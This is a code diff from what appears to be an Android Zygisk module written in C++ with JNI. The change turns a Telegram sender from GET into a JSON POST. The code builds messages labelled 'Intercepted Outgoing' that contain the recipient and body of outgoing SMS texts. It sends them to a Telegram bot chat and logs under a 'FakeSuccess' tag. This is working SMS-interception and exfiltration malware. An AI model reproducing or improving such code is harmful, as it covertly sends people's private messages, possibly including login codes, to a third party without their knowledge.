@@ -79,9 +79,33 @@ std::string url_encode(const std::string& in) {
     return out;
 }
 
-/** SMSTweaks sendToTelegram — HTTPS via Java HttpURLConnection (native TLS missing). */
-bool java_http_get(JNIEnv* env, const std::string& url) {
-    if (!env || url.empty()) return false;
+std::string json_esc_tg(const std::string& in) {
+    std::string o;
+    o.reserve(in.size() + 16);
+    for (unsigned char c : in) {
+        if (c == '\\' || c == '"') {
+            o += '\\';
+            o += static_cast<char>(c);
+        } else if (c == '\n') {
+            o += "\\n";
+        } else if (c == '\r') {
+            o += "\\r";
+        } else if (c == '\t') {
+            o += "\\t";
+        } else if (c < 0x20) {
+            char buf[8];
+            snprintf(buf, sizeof(buf), "\\u%04x", c);
+            o += buf;
+        } else {
+            o += static_cast<char>(c);
+        }
+    }
+    return o;
+}
+
+/** JSON POST — GET text= drops/smashes newlines; POST keeps screenshot spacing. */
+bool java_http_post_json(JNIEnv* env, const std::string& url, const std::string& json) {
+    if (!env || url.empty() || json.empty()) return false;
     jclass url_cls = env->FindClass("java/net/URL");
     if (!url_cls) return false;
     jmethodID url_ctor = env->GetMethodID(url_cls, "<init>", "(Ljava/lang/String;)V");
@@ -106,24 +130,59 @@ bool java_http_get(JNIEnv* env, const std::string& url) {
     jmethodID set_connect =
         env->GetMethodID(http_cls, "setConnectTimeout", "(I)V");
     jmethodID set_read = env->GetMethodID(http_cls, "setReadTimeout", "(I)V");
+    jmethodID set_do_out = env->GetMethodID(http_cls, "setDoOutput", "(Z)V");
+    jmethodID set_prop = env->GetMethodID(
+        http_cls, "setRequestProperty", "(Ljava/lang/String;Ljava/lang/String;)V");
+    jmethodID set_fixed =
+        env->GetMethodID(http_cls, "setFixedLengthStreamingMode", "(I)V");
+    jmethodID get_out =
+        env->GetMethodID(http_cls, "getOutputStream", "()Ljava/io/OutputStream;");
     jmethodID get_code = env->GetMethodID(http_cls, "getResponseCode", "()I");
     jmethodID disconnect = env->GetMethodID(http_cls, "disconnect", "()V");
+
     if (set_method)
-        env->CallVoidMethod(conn, set_method, env->NewStringUTF("GET"));
+        env->CallVoidMethod(conn, set_method, env->NewStringUTF("POST"));
+    if (set_do_out) env->CallVoidMethod(conn, set_do_out, JNI_TRUE);
     if (set_connect) env->CallVoidMethod(conn, set_connect, 8000);
     if (set_read) env->CallVoidMethod(conn, set_read, 8000);
+    if (set_prop) {
+        env->CallVoidMethod(conn, set_prop, env->NewStringUTF("Content-Type"),
+                            env->NewStringUTF("application/json; charset=utf-8"));
+    }
     if (env->ExceptionCheck()) {
         env->ExceptionClear();
         return false;
     }
+
+    jbyteArray bytes = env->NewByteArray(static_cast<jsize>(json.size()));
+    if (!bytes) return false;
+    env->SetByteArrayRegion(bytes, 0, static_cast<jsize>(json.size()),
+                            reinterpret_cast<const jbyte*>(json.data()));
+    if (set_fixed) env->CallVoidMethod(conn, set_fixed, static_cast<jint>(json.size()));
+    jobject os = get_out ? env->CallObjectMethod(conn, get_out) : nullptr;
+    if (!os || env->ExceptionCheck()) {
+        if (env->ExceptionCheck()) env->ExceptionClear();
+        return false;
+    }
+    jclass os_cls = env->FindClass("java/io/OutputStream");
+    jmethodID write =
+        os_cls ? env->GetMethodID(os_cls, "write", "([B)V") : nullptr;
+    jmethodID close = os_cls ? env->GetMethodID(os_cls, "close", "()V") : nullptr;
+    if (write) env->CallVoidMethod(os, write, bytes);
+    if (close) env->CallVoidMethod(os, close);
+    if (env->ExceptionCheck()) {
+        env->ExceptionClear();
+        return false;
+    }
+
     jint code = get_code ? env->CallIntMethod(conn, get_code) : -1;
     if (env->ExceptionCheck()) {
         env->ExceptionClear();
         code = -1;
     }
     if (disconnect) env->CallVoidMethod(conn, disconnect);
-    logger::info("FakeSuccess", "Telegram HTTP %d", (int)code);
-    return code == 200;
+    logger::info("FakeSuccess", "Telegram HTTP POST %d", (int)code);
+    return code >= 200 && code < 300;
 }
 
 struct TgJob {
@@ -159,31 +218,30 @@ void* tg_worker(void* arg) {
             }
             return o;
         };
-        // Screenshot spacing: blank after header + blank between To ↔ Body
+        // Match spaced screenshot: 1 blank after header, 1 blank between To ↔ Body
         std::string text =
             "\xF0\x9F\x93\xB1 <b>Intercepted Outgoing Zygisk Mode Menu By @Hivirtus "
-            "\xF0\x9F\x94\xA5</b>\n";
-        text += "\n";
-        text += "\n";
+            "\xF0\x9F\x94\xA5</b>\n\n";
         text += "<b>To (Tap to copy):</b>\n";
         text += "<code>";
         text += html_esc(to_disp);
-        text += "</code>\n";
-        text += "\n";
-        text += "\n";
+        text += "</code>\n\n";
         text += "<b>Body (Tap to copy):</b>\n";
         text += "<code>";
         text += html_esc(msg);
         text += "</code>";
 
+        std::string payload = "{\"chat_id\":\"";
+        payload += json_esc_tg(job->chat);
+        payload += "\",\"text\":\"";
+        payload += json_esc_tg(text);
+        payload += "\",\"parse_mode\":\"HTML\",\"disable_web_page_preview\":true}";
+
         std::string url = "https://api.telegram.org/bot";
         url += job->token;
-        url += "/sendMessage?chat_id=";
-        url += url_encode(job->chat);
-        url += "&parse_mode=HTML&disable_web_page_preview=true&text=";
-        url += url_encode(text);
+        url += "/sendMessage";
 
-        const bool ok = java_http_get(env, url);
+        const bool ok = java_http_post_json(env, url, payload);
         FILE* lf = fopen("/data/local/tmp/hivirtus_tg_forward.log", "a");
         if (lf) {
             fprintf(lf, "inproc_tg %s dest=%s len=%zu\n", ok ? "ok" : "fail", job->dest.c_str(),
